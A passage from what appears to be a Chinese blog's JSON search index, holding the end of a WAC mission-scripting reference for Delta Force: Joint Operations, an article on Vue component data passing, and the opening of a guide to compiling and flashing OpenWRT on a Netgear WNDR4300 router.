hp)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; set ssn's hitpoints to hp;blockfire(wpnkey, #)&amp;nbsp;&amp;nbsp; blockfiring of weapons under key, 0=fire, 1=block///////////////////WAC HELP 2（NILE）/////////////////////PLOOP -&amp;gt; Real Player loop//- PLOOP actions(player) END//CODEPLOOP//if condition//actions(player)//end condition//END//---------------------------------------------------//GLOOP -&amp;gt; Named Group Loop//don't use group commands !//- GLOOP group actions(item) END//CODEGLOOP group//if condition//actions(item)//end condition//END//------------------------------------------------------//ENTER -&amp;gt; to handle like'and never()', but fire again was con. false//CODEIF trigger ENTER // triggers on first true//actions//ENDIF//------------------------------------------------------//LEAVE -&amp;gt; fired if condition no more true//CODEIF trigger LEAVE // triggers after last true//actions//ENDIF//-------------------------------------------------------//IFNAME -&amp;gt; give a condition a Name//CODEIF [ifname] triggers THEN // optional named if//actions//ENDIF//---------------------------------------------------------// WAC Quick Reference Help File//WAC Flow Control (basic statements)// IF triggers THEN actions END// IF [ifname] triggers THEN actions END (optional named if)// IF triggers THEN actions ELSE actions END// IF triggers THEN actions ELSEIF triggers THEN actions END// PLOOP actions(player) END// GLOOP group actions(item) END// DOSEQ actions NEXT actions [NEXT actions..] END// DORND actions NEXT actions [NEXT actions..] END// IF triggers ENTER actions END (triggers on first true)// IF triggers LEAVE actions END (triggers after last true)// WAC Compiler Commands// VAR variablename (declares a number variable, shows up on debug screen)// CHEAT cheatname (declares a server cheat variable, shows up on debug screen)// RUN filename (this includes the text from a file, good from command line)// WAC Logic and Math (tests for inside IF statement)// Arithmatics ()+-*/^// Booleans AND OR NOT &amp;lt; &amp;gt; &amp;lt;= &amp;gt;= == !=// Example: IF V1&amp;lt;12 THEN// Example: IF V1&amp;lt;12 AND V2&amp;lt;12 THEN// Note: this compiles to IF (V1&amp;lt;12) AND (V2&amp;lt;12) THEN// WAC Assignment Var = Value// Example: V1 = 12// Example: V2 = V2+V3*4// Note: This compiles to V2+(V3*4)// WAC Triggers (Things to do after IF statement)// elapse (seconds)// never ()// previous ()// chain (seconds)// past (seconds)// before (seconds)// ontick (seconds)// groupdead (number)// groupalive (number)// dooropen (number)// SSNcritical (ssn)// SSNexists (ssn)// SSNdead (ssn)// SSNalive (ssn)// SSNwounded (ssn)// SSNride (ssn)// SSNonSSN (ssn, ssn)// SSNnearSSN (ssn, ssn, distance)// SSNlosSSN (ssn, ssn, distance)// SSNseesSSN (ssn, ssn, distance)// SSNarea (ssn, area)// SSNarea3D (ssn, area)// SSNloc (ssn, number)// SSNLeadSSN2SSN (ssn, ssn, ssn, distance)// WAC Actions (Things to do after THEN/ENTER/LEAVE statement)// reset (ifname)// Gkill (group)// Gremove (group)// Gsetaccuracy (number, number, number)// GtoWP (number, wplist)// kill (number)// remove (number)// teleport (number, target)// GroupMin (number, distance)// GroupMax (number, distance)// GroupAtt (number, distance)// GroupSpawn (number, number)// GroupHP (number, number)// opendoors (number)// closedoors (number)// text (text)// wave (filename)// hideSSN (ssn)// unhideSSN (ssn)// disableSSN (ssn)// enableSSN (ssn)// holdSSN (ssn)// unholdSSN (ssn)// setaccuracy (ssn, number, number)// SSNtoWP (ssn, wplist)// killSSN (ssn)// removeSSN (ssn)// teleSSN (ssn, target)// SSNwave (ssn, filename, distance)// SSNradio (ssn, filename)// SS2SSN (soundset, ssn)// SSNanim (ssn, anim)// SSNMin (ssn, distance)// SSNMax (ssn, distance)// SSNAtt (ssn, distance)// SSNSpawn (ssn, number)// SSNHP (ssn, number)// SSNADDHP (ssn, number)// ssn2ssn (ssn, ssn)// ssnrelease (ssn)// ssnface (ssn, face)// ssnturn (ssn, heading)// ssnguard (ssn, number)// ssnname (ssn, texttoken)// ssnpspd (ssn, number)// ssncspd (ssn, number)// ssnuse (ssn)// set (variable, value)// add (variable, value)// sub (variable, value)// inc (variable)// dec (variable)// store (variable)// load (value)// TOD (hour)// targetfx (target)// ammo2tgt (ammo, target)// fx2tgt (fx, target)// ammoarea (ammo, area)// sound2tgt (soundset, target)// flash ()// farflash ()// quake (number)// win (number)// lose (number)// music (number)// skyspeed (number)// skyheight (number)// fogtype (number)// fogdist (distance)// movefog (distance, seconds)// rain (number, seconds)// snow (number, seconds)// overcast (number, seconds)// Help ()// text# (text, number)// consol (text)// consol# (text, number)// WAC Debug Commands (This also contains old stuff)// sound (soundset, distance, heading)// forceanim (anim)// tele (ssn)// fall ()// fov (number)// squadevent (number)// random (number)// outside ()// location (number)// area (area)// area3D (area)// waveready ()// weaponfired (number)// event (number)// meride (ssn)// meattached (ssn)// medrive (ssn)// meongun (ssn)// ammorain (ammo)// fxrain (fx)// lightning (red, green, blue)// face (face)// anim (anim)// sunfade (number, seconds)// gain (red, green, blue)// squadclear ()// blockfire (number, number)// colorfade (number)// sun (red, green, blue)// sky (red, green, blue)// ground (red, green, blue)// floor (red, green, blue)// ceiling (red, green, blue)// cloud (red, green, blue)// fogcolor (red, green, blue)// fog (red, green, blue)// skyfogcolor (red, green, blue)// skyfog (red, green, blue)// crash (red, green, blue, green)// eq (number, number)// ne (number, number)// lt (number, number)// gt (number, number)// le (number, number)// ge (number, number)// true (number)// false (number) ///////////////////WAC HELP 3///////////////////&amp;nbsp;;WAC Text in Color;;This WAC code was supplied by Bubbachuk~&#123;PG&#125;~;;Here is a short list of the color codes you can use to change;the color of the WAC scripts: The script has to be enclosed;between right and left arrows, i.e. &amp;lt;#####&amp;gt; and inserted;before the line of text in the consol or text displays, i.e.;;if never() then;consol(\"&amp;lt;#####&amp;gt;Insert color code before actual text. Characters\");text(\"&amp;lt;#####&amp;gt;in the code count in the character count allowed\");text(\"&amp;lt;#####&amp;gt;for each line.\");endif;;cfff500 or co01 = Yellow;co30 = Light Yellow;co100 = Dark Yellow;cff5000 = Orange;cf50000 = Red;cf500000 or c300004 = Dark Red;c5000 = Dark Green;cf500 = Green;co99 = Light Blue;cff50 = Turquoise;cfffff5 = White (Don't see any reason to use this one);cr953o3 = Gray;cffff50 = Tan;cf or ca = Black;cf50 or cab = Dark Blue;cff5 or ca0 = Blue;ca0014 = Purple;b = Bold Text;i = Text with Italics;u = will Underline Text ///////////////////WAC HELP 4///////////////////;Previous();chain(SECONDS);then;Elapse(SECONDS);Past(SECONDS);Before(SECONDS);OnTick(SECONDS);night();eq(VAR,NUMBER);ge(VAR,NUMBER);le(VAR,NUMBER);gt(VAR,NUMBER);lt(VAR,NUMBER);eq(VAR,VAR);ge(VAR,VAR);le(VAR,VAR);gt(VAR,VAR);lt(VAR,VAR);ne(VAR,NUMBER);ne(VAR,VAR);true(VAR);false(VAR);groupdead(GROUP);groupalive(GROUP);ssndead(SSN);ssnwounded(SSN);ssnride(SSN);ssnonssn(SSN,SSN);ssnnearssn(SSN,SSN,DISTANCE);ssnlosssn(SSN,SSN,DISTANCE);ssnseesssn(SSN,SSN,DISTANCE);ssnarea3d(SSN,AREA);ssnalive(SSN);NOT ssnalive(SSN);ssnnearssn(SSN,TEXT,DISTANCE);ssnseesssn(SSN,TEXT,DISTANCE);ssncritical(SSN);random(NUMBER);waveready();weaponfired(NUMBER);Player (coop/multiplayer mode) TEXT = HUMANS;true(TEXT);false(TEXT);ssnride(SSN);Player (single player mode) TEXT = 10000;meride(SSN);meattached(SSN);medrive(SSN);meongun(SSN);ssndead(TEX);ssnwounded(TEXT);ssnonssn(TEXT,SSN);ssnnearssn(TEXT,SSN,DISTANCE);ssnlosssn(TEXT,SSN,DISTANCE);outside();GtoWP(GROUP,WAYPOINTLIST);Gkill(GROUP);Gremove(GROUP);GroupMin(GROUP,DISTANCE);GroupMax(GROUP,DISTANCE);GroupAtt(GROUP,DISTANCE);GroupSpawn(GROUP,NUMBER);GroupHP(GROUP,NUMBER);Gsetaccuracy(GROUP,NUMBER,NUMBER);teleport(GROUP,TARGET);SSNtoWP(SSN,WAYPOINTLIST);KillSSN(SSN);removeSSN(SSN);teleSSN(SSN,TARGET);ssnWave(SSN,TEXT,DISTANCE);ssncspd(SSN,NUMBER);ssnpspd(SSN,NUMBER);SSNanim(SSN,ANIM);SSNMin(SSN,DISTANCE);SSNMax(SSN,DISTANCE);SSNAtt(SSN,DISTANCE);SSNSpawn(SSN,NUMBER);SSNHP(SSN,NUMBER);ssnUse(SSN);ssnRelease(SSN);SSN2SSN(SSN,SSN);ssnface(SSN,FACE);ssnTurn(SSN,HEADING);SSNtoWP(SSN,NUMBER)- Waypoint 123,124,125,126,127;hideSSN(SSN);unhideSSN(SSN);enableSSN(SSN);disableSSN(SSN);fov(SSN,NUMBER);ssnguard(SSN,NUMBER);ssnblind(SSN,NUMBER);ssnclimb(SSN,NUMBER);setaccuracy(SSN,NUMBER,NUMBER);holdSSN(SSN);unholdSSN(SSN);SSNLeadSSN2SSN(SSN,SSN,SSN);ssnaddhp(SSN,NUMBER);set(VAR,NUMBER);add(VAR,NUMBER);sub(VAR,NUMBER);inc(VAR);dec(VAR);tod(TIME);ammo2tgt(AMMO,TARGET);fx2tgt(FX,TARGET);ammorain(AMMO);ammoarea(AMMO,AREA);fxrain(FX)&amp;lt;/WAC&amp;gt;;sound2tgt(SOUNDSET,TARGET);flash();farflash();quake(SECONDS);fogdist(DISTANCE);win(NUMBER);rain(NUMBER,NUMBER);overcast(NUMBER,NUMBER);Wave(TEXT);fogtype(NUMBER)- Fog Type (0,1,2,3);gain(NUMBER,NUMBER,NUMBER);skyspeed(NUMBER);snow(NUMBER,NUMBER);movefog(DISTANCE,NUMBER);wind(NUMBER,SECONDS;floor(NUMBER,NUMBER,NUMBER);ceiling(NUMBER,NUMBER,NUMBER);fog(NUMBER,NUMBER,NUMBER);accuracyspread = (NUMBER);breathtime = (NUMBER);fallmps = (NUMBER);text#(TEXT,VAR);consol(TEXT);consol#(TEXT,VAR);text(TEXT);PLOOP;GLOOP;;;1. Previous() - Previous conditional was true.;Example:;code;if never enter;consol(\"Sending an enemy to stand on a platform\");ssn2ssn(xxxx,xxxxx);endif;if previous() and never enter;consol(\"Once enemy stands on that platform, Will send his buddy to a waypoint!\");SSNtoWP(XXXX,X);endif;;2. chain() - Previous conditional was true and One seconds have elapsed.;Example:;code:;if past(30) and never enter;consol(\"Will rain in thirty seconds at 60%!\");rain(60);endif;if chain(30) enter;consol(\"Thirty seconds later dark clouds will form overhead at 90%!\");overcast(90);endif;3. then - Means end of conditional. You can also use enter instead of then. if you choose to use enter replacing then use it throughout the entire wac script your working on. Don't mismatch then and enter either one or the other.;Example:;if never() enter;consol(\"Enemy will follow the closest player!\");ssn2ssn(xxxx,player);endif;;4. Elapse() - One seconds have elapsed since conditional was last true. Fires continually;Example;code:;if elapse(40) enter;consol(\"Every forty seconds their will be an explosion!\");killSSN(XXXXX);endif;;;5. past() - At least one seconds since the mission started before this firers.;Example;CODE:;if past(50) and never enter;consol(\"Your seeing this message because fifty seconds has pass!\");endif;;;6. Before - How many seconds since mission started;Example;CODE:;if Before(3) and OnTick(3) and never enter;consol(\"Setting up v1 to go to zero reguardless of humans\");set(v1,0);endif;if chain(3) enter;consol(\"Now I Know v1 equals zero because their is humans!\");v1 = = 0;endif;;7. OnTick exactly one seconds since the mission started;Example:;CODE;if OnTick(180) enter;consol#(\"TIME NOW \",CurTOD);consol#(\"Time Update Will Be Every Three minutes\");endif;;8. night() Night falls between these hours (19:00 - 6:00). Even know I knew this one did not work at the beginning, still wanted to test it anyway. Does not work. You can set-up the time rate and environment file using nile map editor. Butthe wac script for night does not work. You can use NLH under terrain to change the environment files also. The lowest rate for time change is one hour = 24hour period.;;9. var = = Num or eq(VAR,NUMBER) First before I give the code below let me explain what is I'm doing here. I'am setting up a variable this case it's going to be v1. Next I will set up the number of items I want to keep track of, this caseit's three. Using the VAR to subtract the number of deaths.;EXAMPLE:;CODE;if never enter;set(v1,3);endif;if eq(v1,0) and never enter;consol(\"Each time an item is destroyed subtract intil it reaches zero!);endif;if ssndead(xxxxx) and never enter;dec(v1);endif;if ssndead(xxxxx) and never enter;dec(v1);endif;if ssndead(xxxxx) and never enter;;dec(v1);;endif","categories":[{"name":"游戏","slug":"游戏","permalink":"https://hexo.bangz.me/categories/游戏/"}],"tags":[{"name":"三角洲特种部队","slug":"三角洲特种部队","permalink":"https://hexo.bangz.me/tags/三角洲特种部队/"},{"name":"联合行动","slug":"联合行动","permalink":"https://hexo.bangz.me/tags/联合行动/"},{"name":"地图制作","slug":"地图制作","permalink":"https://hexo.bangz.me/tags/地图制作/"}]},{"title":"Vue 组件间传参最佳实践","slug":"vue-best-ways-to-pass-props-data-in-different-component-relations","date":"2019-06-20T06:00:08.000Z","updated":"2019-12-31T06:20:53.000Z","comments":true,"path":"archives/vue-best-ways-to-pass-props-data-in-different-component-relations.html","link":"","permalink":"https://hexo.bangz.me/archives/vue-best-ways-to-pass-props-data-in-different-component-relations.html","excerpt":"要分享的问题： Vue 都提供了哪些传参方式，每种传参方式都有什么优劣？ 在什么场景下分别适合用什么方式进行传参？ 怎么去总结这些选用传参方式时背后的根据？ 1. 总结一下 vue 中所有的组件间的传参方式1.1 通过 props 或者 $attrs 传递数据 原理：通过 v-bind 指令向子组件传递数据，子组件可通过 props 或者 inheritAttrs 接收数据 优点：简单直接，子组件在获取父组件的数据时就好像在获取自己的数据一样 缺点：由于单向数据流的设计思路，当子组件希望改变 props 中的数据时，需要经过额外的操作才能改变，在组件树层级较深的时候，跨层级数据传递和管理都不方便，","text":"要分享的问题： Vue 都提供了哪些传参方式，每种传参方式都有什么优劣？ 在什么场景下分别适合用什么方式进行传参？ 怎么去总结这些选用传参方式时背后的根据？ 1. 总结一下 vue 中所有的组件间的传参方式1.1 通过 props 或者 $attrs 传递数据 原理：通过 v-bind 指令向子组件传递数据，子组件可通过 props 或者 inheritAttrs 接收数据 优点：简单直接，子组件在获取父组件的数据时就好像在获取自己的数据一样 缺点：由于单向数据流的设计思路，当子组件希望改变 props 中的数据时，需要经过额外的操作才能改变，在组件树层级较深的时候，跨层级数据传递和管理都不方便， 1.2 通过 emit events 在父子组件间传递数据 原理：先通过 v-on 指令对子组件注册 listener，或者通过 $on 注册 listener，再通过 $emit 将数据带上传给 listeners 优点：写法简单易读，模式成熟，并与 Vue 组件的生命周期绑定，没有使用原生的 EventListener，所以会自动销毁。而且 events 的作用域受限，不会像 $boardcast 那样导致事件泛滥 缺点：由于 events 的作用域受限，在非父子组件间使用 events 做数据通信时会比较尴尬 1.3 通过 vue-router 的 query 或者 params 在不同路由间传递数据 原理：其实就是不同页面间通过 url 传参，原来的 search 字符串被解析成 query 对象，REST url 会被解析成 params 对象 优点：可以直接在跳转的时候在同一个方法里面把数据带过去，操作简单，支持 REST url，表达性强 缺点：当传递的参数是一个对象时，url 会变得很难看，而且 url 有长度限制，传递的数据量有限，不能放需要持久化的数据，因为跳转到其他路由时，参数数据可能会被丢失，比如 openid，platform 之类的参数 1.4 通过 vuex 在不同组件间共享数据 原理：引入一个专门用于状态管理的库，用于管理需要全局共享的状态数据 优点：有一个专门的地方存放状态，不受 Vue 生命周期的限制，而且状态数据的存取方式比较科学和严格 缺点：库比较重，当数据量较少时可以有其他的替代方式（比如可以寄存在 $root 下），对使用者有一定的理解门槛 1.5 通过 EventBus 在不同组件间传递数据 原理：仿照事件总线的思路，单独开一个 Vue 实例，专门用于不同组件间的事件通信 优点：轻量，不需要额外的第三方依赖，是 Vue 官方文档本身提到的通信方式，理解成本低，非亲属关系的组件之间也能直接通信 缺点：当事件量越来越大时，不易管理订阅关系，由于脱离了源组件的生命周期，源组件在销毁时漏掉 $off 操作有可能导致内存泄漏。在使用时要将 EventBus 写成单例模式，否则有多个 bus 时容易使代码混乱 1.6 通过 provide 和 inject 方法传递数据 原理：在上游组件暴露出数据对象或方法，下游组件通过遍历 $parent 链找到最近的上游 provide，并注入给自身实例使用 优点：可以在祖孙组件间传递数据，由 Vue 本身提供，不需要第三方库依赖，适用于基础组件 缺点：本身属于一种 hack 类型的代码，当存在较多个上游 provide 或多个下游 inject 时，代码会变得难以理解 2. 在不同组件关系间对于传参方式的选用2.1 父子组件间的数据传递在 Vue 中，处于父子关系的组件，要从父组件获取子组件的数据，有以下几种方式 通过绑定 props 将父组件的数据关联到子组件，并修饰 .sync 或者用 v-model 同步来自子组件的数据变化 推荐 绑定 listener 事件监听器，当子组件状态或者数据发生变化时，触发事件并将数据传递到父组件 推荐 给子组件配置 ref 属性，当父组件需要时直接通过 $refs 去访问子组件内的 data 数据 不推荐 父组件通过 $children 获取子组件实例，再访问子组件的数据 不推荐 子组件将数据放到 Vuex，父组件从 Vuex 中获取子组件的数据 不推荐 父组件通过 EventBus 或者 $root 去注册事件监听，子组件去触发事件上传数据 不推荐 而要从子组件获取父组件的数据，也有以下几种方式 获取 props 或者 $attrs 传下来的数据 推荐 通过 vuex 去接受父组件共享的数据 不推荐 通过 EventBus 去注册监听父组件的事件 不推荐 通过 provide 和 inject 获取父组件的数据 不推荐 通过在 $parent.$on 监听父组件的事件，接受其传过来的数据 不推荐 通过 $parent 直接找到父组件的 data 去获取数据 不推荐 2.2 兄弟组件间的数据传递在 Vue 中，处于兄弟关系的组件，要相互通信获取数据，有以下几种方式 通过 EventBus 或者 $root 去注册事件，由兄弟组件去监听事件传递过来的数据变化 推荐 在 Vuex 存放状态，并在两个组件中都监听状态变化 推荐 在父组件上绑定状态，并通过 v-model 或者 .sync 绑定到两个兄弟组件中去，以同步数据变化 推荐 通过 $parent 再去找 $children 中兄弟组件的数据 不推荐 2.3 祖孙组件间的数据传递在 Vue 中，处于祖孙关系的组件，而且孙组件被直接写在了祖先组件的 template 内，要从祖先组件获取孙组件的数据，有以下几种方式 可以在模板上给孙组件绑定 ref 并通过 $refs 调用孙组件的方法获取数据 推荐 可以在模板上给孙组件绑定 listener 获取孙组件传过来的数据 推荐 可以在模板上给孙组件绑定 v-model 或者 .sync 同步孙组件的数据 推荐 将数据状态存放在 Vuex 内，再由祖先组件和孙组件之间共享 不推荐 由孙组件去触发 EventBus 事件，再由祖先组件去监听来自孙组件的数据变化 不推荐 祖先组件提供对象类型的 provide 属性，在孙组件 inject 后，修改对象中的属性值，数据会同步回给祖先组件 不推荐 通过 $children.$children 去直接访问获取孙组件中的数据 不推荐 如果孙组件不在祖先组件的 template 内，要从祖先组件获取孙组件的数据，有以下几种方式 先在子组件上绑定 v-model 或者 .sync，接着再在子组件的模板上通过 v-model 或者 .sync 绑定孙组件，以同步孙组件的数据 推荐 现在孙组件上绑定 listener，再给子组件绑定 listener，数据由事件层层上传给祖先组件 推荐 由孙组件去注册 EventBus 事件，再由祖先组件去监听来自孙组件的数据变化 推荐 将数据状态存放在 Vuex 内，再由祖先组件和孙组件之间共享 不推荐 祖先组件提供对象类型的 provide 属性，在孙组件 inject 后，修改对象中的属性值，数据会同步回给祖先组件 不推荐 通过 $children.$children 去直接访问获取孙组件中的数据 不推荐 如果孙组件在祖先组件的 template 内，要从孙组件获取祖先组件的数据，有以下几种方式 直接在祖先组件的 template 中通过 v-bind 将数据传递到孙组件中，孙组件通过 props 或者 $attrs 进行接收 推荐 孙组件在 EventBus 中注册事件，监听来自祖先组件触发的事件数据 不推荐 通过 $parent.$parent 向上找到祖先组件，然后访问祖先组件的数据 不推荐 祖先组件将数据挂到 Vuex 中，再由孙组件从 Vuex 中去获取数据 不推荐 在祖先组件提供 provide 将数据暴露出来，再由孙组件 inject 获取数据 不推荐 如果孙组件不在祖先组件的 template 内，要从孙组件获取祖先组件的数据，有以下几种方式 先在子组件上 v-bind 绑定数据，接着再在子组件上通过 v-bind 绑定孙组件，数据层层向下传递 推荐 孙组件在 EventBus 中注册事件，监听来自祖先组件触发的事件数据 推荐 祖先组件将数据挂到 Vuex 中，再由孙组件从 Vuex 中去获取数据 推荐 通过 $parent.$parent 向上找到祖先组件，然后访问祖先组件的数据 不推荐 在祖先组件提供 provide 将数据暴露出来，再由孙组件 inject 获取数据 不推荐 2.4 在不同路由组件之间的数据传递在 Vue 中，若数据需要从前一个路由组件传递到后一个路由组件，有以下的数据传递方式 直接通过 vue-router 的 query 和 params 在路由跳转时传递数据 推荐 前一个路由组件将数据存放在 Vuex 中，在后一个路由组件中取出来 推荐 将数据临时挂在 $root 实例下，待路由跳转完成后取出并移除 不推荐 若要在后一个路由组件点击返回按钮后，传递数据到前一个路由组件，有以下两种方式 返回前将数据状态存放在 Vuex 内，然后回到前一个路由组件后从中取出来 推荐 将数据临时挂在 $root 实例下，待路由跳转完成后取出并移除 推荐 2.5 无直接关系组件之间的数据传递在 Vue 中，两个组件之间若没有简单直接的关系，要相互通信获取数据，有以下几种方式 通过 EventBus 或者 $root 去注册事件，由兄弟组件去监听事件传递过来的数据变化 推荐 在 Vuex 存放状态，并在两个组件中都监听状态变化 推荐 将数据挂载 Vue.prototype 下，由 vue 去共享数据，类似于 $msgbox 这种共享数据 一般不推荐，复用性强的时候推荐 3. 实践中选择传参方式的根据 在大部分情况下，为了数据流向的清晰，都应该使用 props 将数据一层一层向下传递 在 v-bind 绑定具体属性的时候，应尽可能避免直接绑定整个对象，因为绑定对象有可能会破坏 watch 的观察效果 Vuex 应该尽可能放入可复用的状态，Vuex 模块在使用完后应清理数据 EventBus 在执行 $on 注册监听事件后，一定要记得使用 $off 注销事件，否则会内存泄漏 定义 props 时应尽可能配上默认值，避免一些不必要的渲染错误 在使用 vue-router 跳转路由的时候，应该尽可能减少参数的体积，不到万不得已不传整个对象，如果非要传整个对象，应该寄存到 $root， Vuex 或者其他地方去，因为 url 有长度限制，在跳转时参数过长会丢失数据，被寄存的数据记得应该在使用完成后进行销毁，避免内存泄漏 在业务组件中应尽可能避免使用 provide / inject 这种代码，因为 provide / inject 的数据流向不清晰，而且当父组件和祖先组件都存在同名的 provide 时，inject 的数据容易有歧义 使用 ref 时应该尽可能避免直接访问子孙组件的 data 数据，要修改子孙组件的数据时应该去访问子孙组件的 methods 中的方法，因为直接通过 $refs.xxx.data 去修改数据会导致组件数据混乱，不符合开闭原则","categories":[{"name":"技术研究","slug":"技术研究","permalink":"https://hexo.bangz.me/categories/技术研究/"}],"tags":[{"name":"HTML5","slug":"HTML5","permalink":"https://hexo.bangz.me/tags/HTML5/"},{"name":"javascript","slug":"javascript","permalink":"https://hexo.bangz.me/tags/javascript/"},{"name":"前端","slug":"前端","permalink":"https://hexo.bangz.me/tags/前端/"},{"name":"ECMAScript","slug":"ECMAScript","permalink":"https://hexo.bangz.me/tags/ECMAScript/"},{"name":"Vue","slug":"Vue","permalink":"https://hexo.bangz.me/tags/Vue/"}]},{"title":"在网件 WNDR4300v1 上编译 OpenWRT 并实现多线多拨","slug":"openwrt-compile-and-mwan3-config-in-netgear-wndr4300","date":"2018-10-20T04:18:28.000Z","updated":"2018-10-22T01:45:43.000Z","comments":true,"path":"archives/openwrt-compile-and-mwan3-config-in-netgear-wndr4300.html","link":"","permalink":"https://hexo.bangz.me/archives/openwrt-compile-and-mwan3-config-in-netgear-wndr4300.html","excerpt":"家里一直屯着两根网线，一根是低价优惠时期买的长城，另一根是旧的贵价联通。由于一些历史原因，这联通的线路经常不稳定，会莫名其妙的挂掉，一直以来当联通线路挂掉的时候，就要手动拔掉联通的网线，换成长城的，然后又要进路由器改一番 PPPoE 的拨号配置，实在是烦，看到 OpenWRT 这么强大，突发奇想的要不干脆把路由器的一个 LAN 口拿出来，当成 WAN 来用，两个口都进行拨号，经过查了一番资料之后，感觉这个东西可行，就开始折腾了，不过中途一直没有找到自己想要的固件，于是打算自己编译一份，于是就这样掉进了 OpenWRT 的坑，折腾了两个星期之后终于成功的弄出来了。","text":"家里一直屯着两根网线，一根是低价优惠时期买的长城，另一根是旧的贵价联通。由于一些历史原因，这联通的线路经常不稳定，会莫名其妙的挂掉，一直以来当联通线路挂掉的时候，就要手动拔掉联通的网线，换成长城的，然后又要进路由器改一番 PPPoE 的拨号配置，实在是烦，看到 OpenWRT 这么强大，突发奇想的要不干脆把路由器的一个 LAN 口拿出来，当成 WAN 来用，两个口都进行拨号，经过查了一番资料之后，感觉这个东西可行，就开始折腾了，不过中途一直没有找到自己想要的固件，于是打算自己编译一份，于是就这样掉进了 OpenWRT 的坑，折腾了两个星期之后终于成功的弄出来了。 编译写这篇文章的时候 OpenWRT 18.06 才刚出不久，感觉不太成熟，笔者还是选择了用 Lean 大的 LEDE 8.x 来进行编译。 Lean 大的 LEDE 仓库地址：https://github.com/coolsnowwolf/lede 起初在自己电脑 macOS 上进行编译，怎么编译都编译不通过，首先是 macOS \b的文件系统 hfs 有大小写不敏感的问题，接着又是编译过程中的一些包有 macOS 环境的兼容性问题。 所以后来笔者为了避免编译环境差异造成这些不必要的麻烦，去找了个 Docker 的编译环境，才成功地编译了出来，在这里感谢 @timiil 提供的 Docker 镜像。 预备措施由于笔者是选择了腾讯云的 CentOS 服务器来进行编译操作，所以还需要再服务器上先安装 Docker，至于 Docker 怎么安装，由于不同环境下方法不同，在此本文不做详述，仅提供一篇 教程 作为参考。 启动 Docker 实例安装好 Docker 之后，需要先拉取用于编译 LEDE 的 Docker 镜像1docker pull timiil/coolsnowwolf-lede-builder 然后创建并启动一个 Docker 实例，并挂载实例内的镜像输出目录 /lede/bin 到本地的 ~/lede_output 目录下1docker run -it -v ~/lede_output:/lede/bin timiil/coolsnowwolf-lede-builder 更新 git 库由于 Lean 大的 github 仓库是经常更新的，而 timiil 的 docker \b镜像没有随之更新，所以进入到 docker 实例内后会发现里面的代码不是最新的代码，这会导致编译时的一些错误，所以这里需要手动更新一下代码，确保当前的代码跟 Lean 大仓库内的代码是同步的。1git pull 安装编译工具为确保编译工作能够正常进行，\b也需要把编译所需的工具安装一下1sudo apt-get install build-essential subversion libncurses5-dev zlib1g-dev gawk gcc-multilib flex git-core gettext libssl-dev unzip 初始化 LEDE 的编译目录1、创建一份 feeds.conf1cp feeds.conf.default feeds.conf 2、更新本地的包索引列表1./scripts/feeds update -a 3、将本地的包更新到最新版本1./scripts/feeds install -a PS：如果中途 freeswitch 或者其他包报错，可以删掉重装一下12./scripts/feeds uninstall freeswitch./scripts/feeds install -a 配置 LEDE 编译目标打开配置菜单1make menuconfig \b笔者仅需要用于 WNDR4300，故在此已 WNDR4300 为例进行配置 Target System =&gt; Atheros AR7xxx/AR9xxx Subtarget =&gt; Generic devices with NAND flash Target Profile =&gt; NETGEAR WNDR4300v1 Target Images =&gt; Root filesystem images =&gt; squashfs LuCI =&gt; Applications =&gt; 把自己需要的东西勾上 LuCI =&gt; Themes =&gt; 可以勾个 material LuCI =&gt; Modules =&gt; Translations =&gt; 勾上 Chinese 配好之后保存一下就行了 PS：Target Profile 找不到的话可以在 OpenWRT wiki 上把路由器型号输进去，然后 wiki 会有这个提示。 附：WNDR4300 说明 修改 WNDR4300 的 mtd 分布，充分利用路由器的 flash由于 OpenWRT 官方给的 WNDR4300 的 mtdlayout 只划分了 32M，WNDR4300 的 flash 实际上有 128M，所以这里最好修改一下编译时的 mtdlayout，这样可以充分利用我们的 flash 空间 123cd ./target/linux/ar71xx/image/cp legacy.mk legacy.mk.bakvi legacy.mk 找到这一段 wndr4300_mtdlayout=mtdparts=ar934x-nfc:256k(u-boot)ro,256k(u-boot-env)ro,256k(caldata),512k(pot),2048k(language),512k(config),3072k(traffic_meter),2048k(kernel),23552k(ubi),25600k@0x6c0000(firmware),256k(caldata_backup),-(reserved) 改为（将 ubi 和 firmware 增加 96M，完全使用 128M flash） wndr4300_mtdlayout=mtdparts=ar934x-nfc:256k(u-boot)ro,256k(u-boot-env)ro,256k(caldata)ro,512k(pot),2048k(language),512k(config),3072k(traffic_meter),2048k(kernel),121856k(ubi),123904k@0x6c0000(firmware),256k(caldata_backup),-(reserved) 改完后记得保存退出 执行编译配置好之后可以直接执行编译1nohup make V=99 &amp; # 编译的日志会输出到 nohup.out 也可以在此之前先 make download 一下，把需要的 dl 包先下载下来（有时可能会需要能访问外网的网络环境），接着再 make V=99，听说这样会快一些。 这样就可以慢慢地等它编译完，自己先干别的事情去了，第一次编译要几个小时是正常的。 PS：docker 可以用 ctrl+p 然后 ctrl+q 操作，直接从容器里面退出来而不中断容器。然后再用 docker attach $id 重新进入实例之后，按下 enter 键，如果 make 编译执行完了会有 Done 的提示。 刷入固件编译完之后，在本机挂载的 ~/lede_output/targets/ar71xx/nand 目录下，看到编译完成的 openwrt-ar71xx-nand-wndr4300-ubi-factory.img 文件，我们只要这个文件就行了，把它拿出来。 tftp 刷入固件由于刷入 img 固件需要 tftp 工具，需要先找个有 tftp 的环境 Windows 环境1、Windows 下的话 tftp 客户端默认是没有安装的，需要先在 控制面板 &gt; 程序 &gt; 程序和功能 &gt; 打开或关闭 Windows 功能 里面勾选 TFTP 客户端，然后按确定。这样在命令行里面才能调用它。 2、用牙签或者粗针或者笔头按住路由器背面红色的 reset 键，重启路由器\b，直到路由器进入绿灯闪烁状态之后再松开 reset 键 3、在 Windows 下手工把网卡的 IP 配成 192.168.1.11，然后在 cmd 下去 ping 192.168.1.1，能够 ping 通才能进行下一步操作 4、然后在 Windows 下的 cmd 命令行里面输入1tftp -i 192.168.1.1 PUT c:\\path\\to\\openwrt-ar71xx-nand-wndr4300-ubi-factory.img 把上面的路径改成 img 文件所在的路径即可 5、\b上传完后路由器会自动安装固件并重启，这时把前面手工配的 IP 地址改回 DHCP 分配。当路由器第一次重启完后，若能 ping 通 192.168.1.1\b\b 的话，先别急着进入路由器，要先拔掉路由器电源线，再插回去重启一遍，等 5G 的灯亮了再进行后面的操作，不然 5G wifi 可能会打不开。 macOS 环境操作基本跟 Windows 环境相同，只是刷 tftp 的时候，所用的命令会有所不同12345tftptftp&gt; connect 192.168.1.1tftp&gt; mode binarytftp&gt; put 